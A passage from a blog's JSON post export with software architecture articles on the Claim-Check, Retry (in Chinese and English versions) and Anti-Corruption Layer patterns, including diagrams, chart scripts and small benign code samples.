pattern, Claim-Check introduces trade-offs: ⚠️ Potential DrawbacksIncreased Complexity: Additional infrastructure and coordination required Latency: Extra network round-trip to retrieve payloads Consistency Challenges: Ensuring message and payload remain synchronized Operational Overhead: Managing lifecycle of stored payloads Evaluate these trade-offs against your specific requirements. The pattern works best when message size or performance issues outweigh the added complexity. Real-World Implementation Patterns Pattern 1: Automatic Token Generation Use event-driven mechanisms to automatically generate tokens when files are uploaded: &#x2F;&#x2F; File upload triggers automatic claim-check generation dataStore.on(&#39;upload&#39;, async (file) &#x3D;&gt; &#123; const token &#x3D; generateClaimCheck(file.id); await messagingSystem.send(&#123; event: &#39;file-uploaded&#39;, claimCheck: token, metadata: file.metadata &#125;); &#125;); Pattern 2: Manual Token Generation Application explicitly manages token creation and payload storage: &#x2F;&#x2F; Application controls the entire process async function processLargeOrder(order) &#123; const token &#x3D; await storeOrderDocuments(order.documents); await sendOrderMessage(&#123; orderId: order.id, claimCheck: token &#125;); &#125; Conclusion The Claim-Check pattern provides an elegant solution to the challenge of handling large payloads in messaging systems. By separating storage from message delivery, it enables systems to: Overcome message size limitations Maintain high performance Enhance security and reliability Optimize costs While it introduces additional complexity, the benefits often far outweigh the costs in systems dealing with large data transfers. Consider implementing this pattern when your messaging infrastructure struggles with payload sizes or when you need to protect sensitive data while maintaining efficient message delivery. Related Patterns Asynchronous Request-Reply: Complements Claim-Check for long-running operations Competing Consumers: Works well with Claim-Check for parallel processing Split and Aggregate: Alternative approach for handling large messages References Enterprise Integration Patterns: Claim Check Microsoft Azure Architecture Patterns: Claim-Check","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Messaging","slug":"Messaging","permalink":"https://neo01.com/tags/Messaging/"},{"name":"Integration Patterns","slug":"Integration-Patterns","permalink":"https://neo01.com/tags/Integration-Patterns/"}]},{"title":"重试模式：构建具韧性的应用程序","slug":"2019/03/Retry-Pattern-zh-CN","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-CN/2019/03/Retry-Pattern/","permalink":"https://neo01.com/zh-CN/2019/03/Retry-Pattern/","excerpt":"了解重试模式如何帮助应用程序优雅地处理暂时性故障，提升分布式系统的稳定性和用户体验。","text":"当你的应用程序与远程服务通信时——数据库、API、消息队列——可能会出错。网络中断、服务器忙碌或暂时性超时都可能导致请求失败。重试模式帮助你的应用程序优雅地处理这些暂时性故障，将潜在的失败转化为成功。 情境与问题 分布式系统经常面临暂时性故障： 网络连接中断：组件之间的短暂断线 服务不可用：部署或重启期间的暂时性服务中断 超时：服务在高负载下响应时间过长 节流：服务在过载时拒绝请求 这些故障通常会自我修正。暂时过载的数据库可能现在拒绝你的连接，但在清除积压工作后一秒钟就会接受。如果没有重试机制，你的应用程序会将这些暂时性问题视为永久性故障，不必要地降低用户体验。 解决方案 设计你的应用程序以预期暂时性故障并透明地处理它们。重试模式引入一种机制，自动重试失败的操作，将对业务功能的影响降到最低。 graph LR A[\"应用程序\"] --> B[\"重试逻辑\"] B --> C[\"远程服务\"] C -->|\"成功\"| D[\"返回结果\"] C -->|\"暂时性故障\"| E[\"等待并重试\"] E --> C C -->|\"超过最大重试次数\"| F[\"处理异常\"] style A fill:#e1f5ff style B fill:#fff4e1 style C fill:#ffe1e1 style D fill:#d3f9d8 💡 内置重试机制许多现代客户端库和框架都包含可配置的重试逻辑。在实现自定义重试代码之前，请先查看你的库文档。 !!! 重试策略 根据故障类型和应用程序需求选择重试策略： 1. 取消 何时使用：故障表示永久性问题或即使重试也不会成功的操作。 示例： 身份验证失败 无效的请求参数 找不到资源错误 操作：立即取消操作并报告异常。 2. 立即重试 何时使用：故障不寻常或罕见，例如网络数据包损坏。 示例： 随机网络传输错误 暂时性连接重置 操作：立即重试请求，不延迟。 3. 延迟后重试 何时使用：故障常见且与连接或服务负载相关。 示例： 连接超时 服务忙碌响应 节流错误 操作：等待后再重试，使用以下延迟策略之一： 固定延迟：每次重试之间等待相同的时间。 尝试 1 → 等待 2 秒 → 尝试 2 → 等待 2 秒 → 尝试 3 递增延迟：线性增加等待时间。 尝试 1 → 等待 2 秒 → 尝试 2 → 等待 4 秒 → 尝试 3 → 等待 6 秒 → 尝试 4 指数退避：每次失败后将等待时间加倍。 尝试 1 → 等待 1 秒 → 尝试 2 → 等待 2 秒 → 尝试 3 → 等待 4 秒 → 尝试 4 → 等待 8 秒 → 尝试 5 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_03101aaa8')); var option = { \"title\": { \"text\": \"重试延迟策略比较\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"固定 (2秒)\", \"递增 (2秒)\", \"指数 (1秒基数)\"] }, \"xAxis\": { \"type\": \"category\", \"name\": \"重试尝试\", \"data\": [\"第1次\", \"第2次\", \"第3次\", \"第4次\", \"第5次\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"延迟（秒）\" }, \"series\": [ { \"name\": \"固定 (2秒)\", \"type\": \"line\", \"data\": [2, 2, 2, 2, 2], \"itemStyle\": { \"color\": \"#1976d2\" } }, { \"name\": \"递增 (2秒)\", \"type\": \"line\", \"data\": [2, 4, 6, 8, 10], \"itemStyle\": { \"color\": \"#f57c00\" } }, { \"name\": \"指数 (1秒基数)\", \"type\": \"line\", \"data\": [1, 2, 4, 8, 16], \"itemStyle\": { \"color\": \"#388e3c\" } } ] }; chart.setOption(option); } })(); 带抖动的指数退避：在指数延迟中加入随机性，以防止多个客户端同时重试（&quot;惊群&quot;问题）。 实现考量 日志策略 适当记录故障以避免警报疲劳： 早期故障：记录为信息条目 成功重试：记录在调试级别 最终故障：仅在所有重试都用尽后记录为错误 这种方法为操作人员提供可见性，而不会用自我修正问题的警报淹没他们。 graph TB A[\"请求失败\"] --> B[\"日志：INFO - 尝试 1 失败\"] B --> C[\"等待并重试\"] C --> D[\"请求再次失败\"] D --> E[\"日志：INFO - 尝试 2 失败\"] E --> F[\"等待并重试\"] F --> G{\"成功？\"} G -->|\"是\"| H[\"日志：DEBUG - 尝试 3 成功\"] G -->|\"否（最大重试次数）\"| I[\"日志：ERROR - 所有重试已用尽\"] style A fill:#ffe1e1 style H fill:#d3f9d8 style I fill:#ff6b6b 性能影响 调整重试策略以符合业务需求： 交互式应用程序（Web 应用程序、移动应用程序）： 快速失败，较少重试次数 尝试之间使用短延迟 显示用户友好消息（“请稍后再试”） 批处理应用程序（数据处理、ETL 作业）： 使用更多重试尝试 采用指数退避与较长延迟 优先考虑完成而非速度 ⚠️ 避免激进重试激进的重试策略（许多重试且延迟最小）可能会使情况恶化： 进一步降低已经过载的服务 降低应用程序的响应性 在系统中造成级联故障 考虑在重试之外实现断路器模式，以防止压垮失败的服务。 !!! 幂等性 在应用重试之前，确保操作是幂等的（多次执行是安全的）。非幂等操作可能导致意外的副作用： 问题情境： 服务接收请求并成功处理 服务因网络问题无法发送响应 客户端重试，导致重复处理 解决方案： 设计操作为自然幂等 使用唯一请求标识符来检测重复 实现服务器端去重逻辑 异常类型 不同的异常需要不同的重试策略： 异常类型 重试策略 示例 暂时性网络错误 延迟后重试 连接超时、DNS 解析失败 服务忙碌/节流 指数退避重试 HTTP 429、HTTP 503 身份验证失败 立即取消 无效凭据、过期令牌 无效请求 立即取消 HTTP 400、格式错误的数据 找不到资源 立即取消 HTTP 404 事务一致性 在事务中重试操作时： 微调重试策略以最大化成功概率 最小化回滚事务步骤的需求 考虑分布式场景的补偿事务 确保重试逻辑不违反事务隔离级别 测试与验证 🧪 测试检查清单 针对各种故障条件进行测试（超时、连接错误、服务不可用） 验证正常和故障场景下的性能影响 确认下游服务没有过度负载 检查并发重试的竞争条件 验证不同故障阶段的日志输出 测试事务回滚场景 !!! 嵌套重试策略 避免分层多个重试策略： 问题：任务 A（有重试策略）调用任务 B（也有重试策略）。这会造成指数级的重试尝试和不可预测的延迟。 解决方案：配置低级别任务快速失败并报告故障。让高级别任务根据自己的策略处理重试。 graph TB A[\"任务 A（重试策略）\"] --> B[\"任务 B（无重试）\"] B -->|\"快速失败\"| A A -->|\"根据策略重试\"| B style A fill:#e1f5ff style B fill:#fff4e1 何时使用此模式 使用重试模式当： 你的应用程序与远程服务或资源交互 故障预期是暂时性且短暂的 重复失败的请求有很大机会成功 操作是幂等的或可以变成幂等的 不要使用重试模式当： 故障可能是长期的（改用断路器） 处理非暂时性故障（业务逻辑错误、验证失败） 解决可扩展性问题（改为扩展服务） 操作有重大副作用且不是幂等的 与断路器结合 重试和断路器模式相辅相成： 重试：通过再次尝试操作来处理暂时性故障 断路器：当已知服务停机时防止重试 stateDiagram-v2 [*] --> Closed: 正常运作 Closed --> Open: 超过故障阈值 Open --> HalfOpen: 超时已过 HalfOpen --> Closed: 成功 HalfOpen --> Open: 失败 note right of Closed 请求通过 失败时重试 end note note right of Open 请求立即失败 不尝试重试 end note note right of HalfOpen 允许有限请求 测试服务恢复 end note 这些模式一起提供全面的故障处理： 重试处理暂时性故障 断路器防止压垮失败的服务 即使在长时间中断期间，系统仍保持响应 相关模式 断路器：防止应用程序重复尝试执行可能失败的操作，使其能够继续运作而无需等待故障修复。 节流：控制应用程序实例、服务或租户的资源消耗。 速率限制：管理发送到服务的请求速率，以避免压垮它。 参考资料 Retry Pattern - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"重試模式：建構具韌性的應用程式","slug":"2019/03/Retry-Pattern-zh-TW","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-TW/2019/03/Retry-Pattern/","permalink":"https://neo01.com/zh-TW/2019/03/Retry-Pattern/","excerpt":"了解重試模式如何幫助應用程式優雅地處理暫時性故障，提升分散式系統的穩定性和使用者體驗。","text":"當你的應用程式與遠端服務通訊時——資料庫、API、訊息佇列——可能會出錯。網路中斷、伺服器忙碌或暫時性逾時都可能導致請求失敗。重試模式幫助你的應用程式優雅地處理這些暫時性故障，將潛在的失敗轉化為成功。 情境與問題 分散式系統經常面臨暫時性故障： 網路連線中斷：元件之間的短暫斷線 服務不可用：部署或重啟期間的暫時性服務中斷 逾時：服務在高負載下回應時間過長 節流：服務在過載時拒絕請求 這些故障通常會自我修正。暫時過載的資料庫可能現在拒絕你的連線，但在清除積壓工作後一秒鐘就會接受。如果沒有重試機制，你的應用程式會將這些暫時性問題視為永久性故障，不必要地降低使用者體驗。 解決方案 設計你的應用程式以預期暫時性故障並透明地處理它們。重試模式引入一種機制，自動重試失敗的操作，將對業務功能的影響降到最低。 graph LR A[\"應用程式\"] --> B[\"重試邏輯\"] B --> C[\"遠端服務\"] C -->|\"成功\"| D[\"回傳結果\"] C -->|\"暫時性故障\"| E[\"等待並重試\"] E --> C C -->|\"超過最大重試次數\"| F[\"處理例外\"] style A fill:#e1f5ff style B fill:#fff4e1 style C fill:#ffe1e1 style D fill:#d3f9d8 💡 內建重試機制許多現代客戶端函式庫和框架都包含可設定的重試邏輯。在實作自訂重試程式碼之前，請先查看你的函式庫文件。 !!! 重試策略 根據故障類型和應用程式需求選擇重試策略： 1. 取消 何時使用：故障表示永久性問題或即使重試也不會成功的操作。 範例： 驗證失敗 無效的請求參數 找不到資源錯誤 動作：立即取消操作並回報例外。 2. 立即重試 何時使用：故障不尋常或罕見，例如網路封包損毀。 範例： 隨機網路傳輸錯誤 暫時性連線重設 動作：立即重試請求，不延遲。 3. 延遲後重試 何時使用：故障常見且與連線或服務負載相關。 範例： 連線逾時 服務忙碌回應 節流錯誤 動作：等待後再重試，使用以下延遲策略之一： 固定延遲：每次重試之間等待相同的時間。 嘗試 1 → 等待 2 秒 → 嘗試 2 → 等待 2 秒 → 嘗試 3 遞增延遲：線性增加等待時間。 嘗試 1 → 等待 2 秒 → 嘗試 2 → 等待 4 秒 → 嘗試 3 → 等待 6 秒 → 嘗試 4 指數退避：每次失敗後將等待時間加倍。 嘗試 1 → 等待 1 秒 → 嘗試 2 → 等待 2 秒 → 嘗試 3 → 等待 4 秒 → 嘗試 4 → 等待 8 秒 → 嘗試 5 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_79754f271')); var option = { \"title\": { \"text\": \"重試延遲策略比較\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"固定 (2秒)\", \"遞增 (2秒)\", \"指數 (1秒基數)\"] }, \"xAxis\": { \"type\": \"category\", \"name\": \"重試嘗試\", \"data\": [\"第1次\", \"第2次\", \"第3次\", \"第4次\", \"第5次\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"延遲（秒）\" }, \"series\": [ { \"name\": \"固定 (2秒)\", \"type\": \"line\", \"data\": [2, 2, 2, 2, 2], \"itemStyle\": { \"color\": \"#1976d2\" } }, { \"name\": \"遞增 (2秒)\", \"type\": \"line\", \"data\": [2, 4, 6, 8, 10], \"itemStyle\": { \"color\": \"#f57c00\" } }, { \"name\": \"指數 (1秒基數)\", \"type\": \"line\", \"data\": [1, 2, 4, 8, 16], \"itemStyle\": { \"color\": \"#388e3c\" } } ] }; chart.setOption(option); } })(); 帶抖動的指數退避：在指數延遲中加入隨機性，以防止多個客戶端同時重試（「驚群」問題）。 實作考量 記錄策略 適當記錄故障以避免警報疲勞： 早期故障：記錄為資訊項目 成功重試：記錄在除錯層級 最終故障：僅在所有重試都用盡後記錄為錯誤 這種方法為操作人員提供可見性，而不會用自我修正問題的警報淹沒他們。 graph TB A[\"請求失敗\"] --> B[\"記錄：INFO - 嘗試 1 失敗\"] B --> C[\"等待並重試\"] C --> D[\"請求再次失敗\"] D --> E[\"記錄：INFO - 嘗試 2 失敗\"] E --> F[\"等待並重試\"] F --> G{\"成功？\"} G -->|\"是\"| H[\"記錄：DEBUG - 嘗試 3 成功\"] G -->|\"否（最大重試次數）\"| I[\"記錄：ERROR - 所有重試已用盡\"] style A fill:#ffe1e1 style H fill:#d3f9d8 style I fill:#ff6b6b 效能影響 調整重試策略以符合業務需求： 互動式應用程式（網頁應用程式、行動應用程式）： 快速失敗，較少重試次數 嘗試之間使用短延遲 顯示使用者友善訊息（「請稍後再試」） 批次應用程式（資料處理、ETL 作業）： 使用更多重試嘗試 採用指數退避與較長延遲 優先考慮完成而非速度 ⚠️ 避免激進重試激進的重試策略（許多重試且延遲最小）可能會使情況惡化： 進一步降低已經過載的服務 降低應用程式的回應性 在系統中造成級聯故障 考慮在重試之外實作斷路器模式，以防止壓垮失敗的服務。 !!! 冪等性 在應用重試之前，確保操作是冪等的（多次執行是安全的）。非冪等操作可能導致意外的副作用： 問題情境： 服務接收請求並成功處理 服務因網路問題無法傳送回應 客戶端重試，導致重複處理 解決方案： 設計操作為自然冪等 使用唯一請求識別碼來偵測重複 實作伺服器端去重邏輯 例外類型 不同的例外需要不同的重試策略： 例外類型 重試策略 範例 暫時性網路錯誤 延遲後重試 連線逾時、DNS 解析失敗 服務忙碌/節流 指數退避重試 HTTP 429、HTTP 503 驗證失敗 立即取消 無效憑證、過期權杖 無效請求 立即取消 HTTP 400、格式錯誤的資料 找不到資源 立即取消 HTTP 404 交易一致性 在交易中重試操作時： 微調重試策略以最大化成功機率 最小化回滾交易步驟的需求 考慮分散式情境的補償交易 確保重試邏輯不違反交易隔離層級 測試與驗證 🧪 測試檢查清單 針對各種故障條件進行測試（逾時、連線錯誤、服務不可用） 驗證正常和故障情境下的效能影響 確認下游服務沒有過度負載 檢查並行重試的競爭條件 驗證不同故障階段的記錄輸出 測試交易回滾情境 !!! 巢狀重試策略 避免分層多個重試策略： 問題：任務 A（有重試策略）呼叫任務 B（也有重試策略）。這會造成指數級的重試嘗試和不可預測的延遲。 解決方案：設定低層級任務快速失敗並回報故障。讓高層級任務根據自己的策略處理重試。 graph TB A[\"任務 A（重試策略）\"] --> B[\"任務 B（無重試）\"] B -->|\"快速失敗\"| A A -->|\"根據策略重試\"| B style A fill:#e1f5ff style B fill:#fff4e1 何時使用此模式 使用重試模式當： 你的應用程式與遠端服務或資源互動 故障預期是暫時性且短暫的 重複失敗的請求有很大機會成功 操作是冪等的或可以變成冪等的 不要使用重試模式當： 故障可能是長期的（改用斷路器） 處理非暫時性故障（業務邏輯錯誤、驗證失敗） 解決可擴展性問題（改為擴展服務） 操作有重大副作用且不是冪等的 與斷路器結合 重試和斷路器模式相輔相成： 重試：透過再次嘗試操作來處理暫時性故障 斷路器：當已知服務停機時防止重試 stateDiagram-v2 [*] --> Closed: 正常運作 Closed --> Open: 超過故障閾值 Open --> HalfOpen: 逾時已過 HalfOpen --> Closed: 成功 HalfOpen --> Open: 失敗 note right of Closed 請求通過 失敗時重試 end note note right of Open 請求立即失敗 不嘗試重試 end note note right of HalfOpen 允許有限請求 測試服務恢復 end note 這些模式一起提供全面的故障處理： 重試處理暫時性故障 斷路器防止壓垮失敗的服務 即使在長時間中斷期間，系統仍保持回應 相關模式 斷路器：防止應用程式重複嘗試執行可能失敗的操作，使其能夠繼續運作而無需等待故障修復。 節流：控制應用程式實例、服務或租戶的資源消耗。 速率限制：管理傳送到服務的請求速率，以避免壓垮它。 參考資料 Retry Pattern - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"Retry Pattern: Building Resilient Applications","slug":"2019/03/Retry-Pattern","date":"un55fin55","updated":"un55fin55","comments":true,"path":"2019/03/Retry-Pattern/","permalink":"https://neo01.com/2019/03/Retry-Pattern/","excerpt":"Learn how the Retry pattern helps applications handle transient failures gracefully, improving stability and user experience in distributed systems.","text":"When your application talks to remote services—databases, APIs, message queues—things can go wrong. A network hiccup, a busy server, or a momentary timeout can cause a request to fail. The Retry pattern helps your application handle these temporary glitches gracefully, turning potential failures into successes. Context and Problem Distributed systems face transient failures regularly: Network connectivity loss: Brief disconnections between components Service unavailability: Temporary service outages during deployments or restarts Timeouts: Services taking too long to respond under heavy load Throttling: Services rejecting requests when overwhelmed These failures are typically self-correcting. A database that’s momentarily overloaded might reject your connection now but accept it a second later after clearing its backlog. Without a retry mechanism, your application treats these temporary issues as permanent failures, degrading user experience unnecessarily. Solution Design your application to expect transient failures and handle them transparently. The Retry pattern introduces a mechanism that automatically retries failed operations, minimizing the impact on business functionality. graph LR A[\"Application\"] --> B[\"Retry Logic\"] B --> C[\"Remote Service\"] C -->|\"Success\"| D[\"Return Result\"] C -->|\"Transient Failure\"| E[\"Wait & Retry\"] E --> C C -->|\"Max Retries Exceeded\"| F[\"Handle Exception\"] style A fill:#e1f5ff style B fill:#fff4e1 style C fill:#ffe1e1 style D fill:#d3f9d8 💡 Built-in Retry MechanismsMany modern client libraries and frameworks include configurable retry logic. Check your library's documentation before implementing custom retry code. !!! Retry Strategies Choose a retry strategy based on the failure type and your application’s requirements: 1. Cancel When to use: The failure indicates a permanent problem or an operation that won’t succeed even with retries. Examples: Authentication failures Invalid request parameters Resource not found errors Action: Cancel the operation immediately and report the exception. 2. Retry Immediately When to use: The failure is unusual or rare, like a corrupted network packet. Examples: Random network transmission errors Transient connection resets Action: Retry the request immediately without delay. 3. Retry After Delay When to use: The failure is common and related to connectivity or service load. Examples: Connection timeouts Service busy responses Throttling errors Action: Wait before retrying, using one of these delay strategies: Fixed Delay: Wait the same amount of time between each retry. Attempt 1 → Wait 2s → Attempt 2 → Wait 2s → Attempt 3 Incremental Delay: Increase the wait time linearly. Attempt 1 → Wait 2s → Attempt 2 → Wait 4s → Attempt 3 → Wait 6s → Attempt 4 Exponential Backoff: Double the wait time after each failure. Attempt 1 → Wait 1s → Attempt 2 → Wait 2s → Attempt 3 → Wait 4s → Attempt 4 → Wait 8s → Attempt 5 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_4d33a7dd4')); var option = { \"title\": { \"text\": \"Retry Delay Strategies Comparison\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"Fixed (2s)\", \"Incremental (2s)\", \"Exponential (1s base)\"] }, \"xAxis\": { \"type\": \"category\", \"name\": \"Retry Attempt\", \"data\": [\"1st\", \"2nd\", \"3rd\", \"4th\", \"5th\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Delay (seconds)\" }, \"series\": [ { \"name\": \"Fixed (2s)\", \"type\": \"line\", \"data\": [2, 2, 2, 2, 2], \"itemStyle\": { \"color\": \"#1976d2\" } }, { \"name\": \"Incremental (2s)\", \"type\": \"line\", \"data\": [2, 4, 6, 8, 10], \"itemStyle\": { \"color\": \"#f57c00\" } }, { \"name\": \"Exponential (1s base)\", \"type\": \"line\", \"data\": [1, 2, 4, 8, 16], \"itemStyle\": { \"color\": \"#388e3c\" } } ] }; chart.setOption(option); } })(); Exponential backoff with jitter: Add randomness to exponential delays to prevent multiple clients from retrying simultaneously (the “thundering herd” problem). Implementation Considerations Logging Strategy Log failures appropriately to avoid alert fatigue: Early failures: Log as informational entries Successful retries: Log at debug level Final failure: Log as an error only after all retries are exhausted This approach gives operators visibility without flooding them with alerts for self-correcting issues. graph TB A[\"Request Fails\"] --> B[\"Log: INFO - Attempt 1 failed\"] B --> C[\"Wait & Retry\"] C --> D[\"Request Fails Again\"] D --> E[\"Log: INFO - Attempt 2 failed\"] E --> F[\"Wait & Retry\"] F --> G{\"Success?\"} G -->|\"Yes\"| H[\"Log: DEBUG - Succeeded on attempt 3\"] G -->|\"No (Max retries)\"| I[\"Log: ERROR - All retries exhausted\"] style A fill:#ffe1e1 style H fill:#d3f9d8 style I fill:#ff6b6b Performance Impact Tune your retry policy to match business requirements: Interactive applications (web apps, mobile apps): Fail fast with fewer retries Use short delays between attempts Display user-friendly messages (“Please try again later”) Batch applications (data processing, ETL jobs): Use more retry attempts Employ exponential backoff with longer delays Prioritize completion over speed ⚠️ Avoid Aggressive RetriesAn aggressive retry policy (many retries with minimal delays) can worsen the situation by: Further degrading an already overloaded service Reducing your application's responsiveness Creating cascading failures across the system Consider implementing the Circuit Breaker pattern alongside retries to prevent overwhelming failing services. !!! Idempotency Ensure operations are idempotent (safe to execute multiple times) before applying retries. Non-idempotent operations can cause unintended side effects: Problem scenario: Service receives request and processes it successfully Service fails to send response due to network issue Client retries, causing duplicate processing Solutions: Design operations to be naturally idempotent Use unique request identifiers to detect duplicates Implement server-side deduplication logic Exception Types Different exceptions require different retry strategies: Exception Type Retry Strategy Example Transient network errors Retry with delay Connection timeout, DNS resolution failure Service busy/throttling Retry with exponential backoff HTTP 429, HTTP 503 Authentication failures Cancel immediately Invalid credentials, expired tokens Invalid requests Cancel immediately HTTP 400, malformed data Resource not found Cancel immediately HTTP 404 Transaction Consistency When retrying operations within transactions: Fine-tune retry policies to maximize success probability Minimize the need to roll back transaction steps Consider compensating transactions for distributed scenarios Ensure retry logic doesn’t violate transaction isolation levels Testing and Validation 🧪 Testing Checklist Test against various failure conditions (timeouts, connection errors, service unavailability) Verify performance impact under normal and failure scenarios Confirm no excessive load on downstream services Check for race conditions with concurrent retries Validate logging output at different failure stages Test transaction rollback scenarios !!! Nested Retry Policies Avoid layering multiple retry policies: Problem: Task A (with retry policy) calls Task B (also with retry policy). This creates exponential retry attempts and unpredictable delays. Solution: Configure lower-level tasks to fail fast and report failures. Let higher-level tasks handle retries based on their own policies. graph TB A[\"Task A(Retry Policy)\"] --> B[\"Task B(No Retry)\"] B -->|\"Fails Fast\"| A A -->|\"Retries Based on Policy\"| B style A fill:#e1f5ff style B fill:#fff4e1 When to Use This Pattern Use the Retry pattern when: Your application interacts with remote services or resources Failures are expected to be transient and short-lived Repeating a failed request has a good chance of succeeding The operation is idempotent or can be made idempotent Don’t use the Retry pattern when: Failures are likely to be long-lasting (use Circuit Breaker instead) Handling non-transient failures (business logic errors, validation failures) Addressing scalability issues (scale the service instead) The operation has significant side effects and isn’t idempotent Combining with Circuit Breaker The Retry and Circuit Breaker patterns complement each other: Retry: Handles transient failures by attempting the operation again Circuit Breaker: Prevents retries when a service is known to be down stateDiagram-v2 [*] --> Closed: Normal Operation Closed --> Open: Failure Threshold Exceeded Open --> HalfOpen: Timeout Elapsed HalfOpen --> Closed: Success HalfOpen --> Open: Failure note right of Closed Requests pass through Retries on failure end note note right of Open Requests fail immediately No retries attempted end note note right of HalfOpen Limited requests allowed Testing service recovery end note Together, these patterns provide comprehensive fault handling: Retry handles temporary glitches Circuit Breaker prevents overwhelming failing services System remains responsive even during prolonged outages Related Patterns Circuit Breaker: Prevents an application from repeatedly trying to execute an operation that’s likely to fail, allowing it to continue without waiting for the fault to be fixed. Throttling: Controls the consumption of resources by an application instance, service, or tenant. Rate Limiting: Manages the rate at which requests are sent to a service to avoid overwhelming it. References Retry Pattern - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"防腐層模式：保護你的現代化架構","slug":"2019/02/Anti-Corruption-Layer-Pattern-zh-TW","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-TW/2019/02/Anti-Corruption-Layer-Pattern/","permalink":"https://neo01.com/zh-TW/2019/02/Anti-Corruption-Layer-Pattern/","excerpt":"了解防腐層模式如何協助你整合舊系統與現代應用程式，同時不損害你的乾淨架構設計。","text":"在建構現代應用程式時，你經常需要整合不共享相同設計原則的舊系統或外部服務。防腐層模式為這個挑戰提供了優雅的解決方案，作為一個保護屏障，防止你的乾淨架構被過時或設計不良的外部系統「污染」。 🎯 什麼是防腐層模式？ 防腐層（ACL）模式最早由 Eric Evans 在其開創性著作《領域驅動設計》中描述，它在不共享相同語義的不同子系統之間實作了一個外觀層或適配器層。這一層轉譯一個子系統向另一個子系統發出的請求，確保你的應用程式設計不受外部系統依賴的限制。 可以把它想像成兩個說不同語言、遵循不同習俗的國家之間的外交翻譯。翻譯確保順暢溝通，同時每個國家都保持自己的文化和實踐。 📖 問題：舊系統整合 大多數應用程式依賴其他系統來獲取資料或功能。考慮這些常見場景： 舊系統遷移：舊應用程式正在遷移到現代系統，但在過渡期間仍需要存取現有的舊資源 漸進式現代化：大型應用程式的不同功能隨時間逐步遷移到現代系統 第三方整合：你的應用程式需要與你無法控制的外部系統通訊 舊系統通常存在品質問題： 複雜的資料結構 過時的 API 過時的協定 文件不足 不一致的命名慣例 為了與這些系統互通，你的新應用程式可能被迫支援過時的基礎設施、協定、資料模型或 API——這些都是你原本不會在現代應用程式中包含的功能。這會「污染」原本可以是乾淨設計的系統。 ⚠️ 污染風險維護新舊系統之間的直接存取可能迫使新系統遵守舊系統的 API 和語義。當這些舊功能存在品質問題時，它們會損害你現代應用程式的設計完整性。 !!! 💡 解決方案：透過轉譯進行隔離 防腐層模式透過隔離不同的子系統並在它們之間放置一個轉譯層來解決這個問題。這一層處理兩個系統之間的所有通訊，允許一個系統保持不變，而另一個系統避免損害其設計。 graph LR A[\"現代應用程式（子系統 A）\"] ACL[\"防腐層\"] B[\"舊系統（子系統 B）\"] A -->|\"乾淨的 API現代資料模型\"| ACL ACL -->|\"舊 API舊資料模型\"| B style A fill:#4CAF50,stroke:#2E7D32,color:#fff style ACL fill:#2196F3,stroke:#1565C0,color:#fff style B fill:#FF9800,stroke:#E65100,color:#fff 運作方式 子系統 A（你的現代應用程式）使用自己的乾淨資料模型和架構呼叫防腐層 ACL 將請求轉譯為子系統 B 預期的格式 子系統 B（舊系統）以其原生格式接收請求 ACL 將回應轉譯回子系統 A 的格式 子系統 A 以其預期的格式接收資料，完全不知道舊系統的怪癖 防腐層包含在兩個系統之間進行轉譯所需的所有邏輯，包括： 資料轉換：在不同資料模型之間轉換 協定適配：橋接不同的通訊協定 API 映射：在不同的 API 契約之間轉譯 錯誤處理：轉換錯誤格式和代碼 🏗️ 實作方法 防腐層可以透過多種方式實作： 1. 應用程式內的元件 將 ACL 實作為應用程式內的模組或元件： &#x2F;&#x2F; 範例：ACL 作為服務類別 class LegacySystemAdapter &#123; constructor(legacyClient) &#123; this.legacyClient &#x3D; legacyClient; &#125; async getCustomer(customerId) &#123; &#x2F;&#x2F; 呼叫舊系統 const legacyData &#x3D; await this.legacyClient.fetchCustomerRecord(customerId); &#x2F;&#x2F; 轉換為現代格式 return &#123; id: legacyData.CUST_ID, name: &#96;$&#123;legacyData.FIRST_NM&#125; $&#123;legacyData.LAST_NM&#125;&#96;, email: legacyData.EMAIL_ADDR, createdAt: new Date(legacyData.CREATE_DT) &#125;; &#125; &#125; 2. 獨立服務 將 ACL 部署為獨立的微服務： graph TB subgraph \"現代架構\" A1[服務 A] A2[服務 B] A3[服務 C] end ACL[\"ACL 服務\"] subgraph \"舊系統\" L1[舊資料庫] L2[舊 API] end A1 --> ACL A2 --> ACL A3 --> ACL ACL --> L1 ACL --> L2 style ACL fill:#2196F3,stroke:#1565C0,color:#fff 3. API 閘道模式 使用 API 閘道來實作 ACL 功能： 集中式轉譯邏輯 速率限制和快取 身份驗證和授權 請求/回應轉換 ⚖️ 關鍵考量 在實作防腐層之前，請考慮這些重要因素： 效能影響 🐌 延遲考量防腐層在通訊路徑中增加了額外的跳躍，這會引入延遲。測量和監控這種影響，特別是對於高頻率操作。 !!! 緩解策略： 為經常存取的資料實作快取 盡可能使用非同步通訊 最佳化轉換邏輯 考慮批次操作 營運開銷 ACL 是一個需要以下資源的額外元件： 部署和託管：基礎設施和資源 監控：健康檢查、指標和日誌記錄 維護：更新、錯誤修復和改進 文件：API 契約和轉換規則 可擴展性 考慮你的防腐層將如何擴展： 隨著應用程式成長，它能處理增加的負載嗎？ 它應該是水平可擴展的嗎？ 瓶頸在哪裡？ 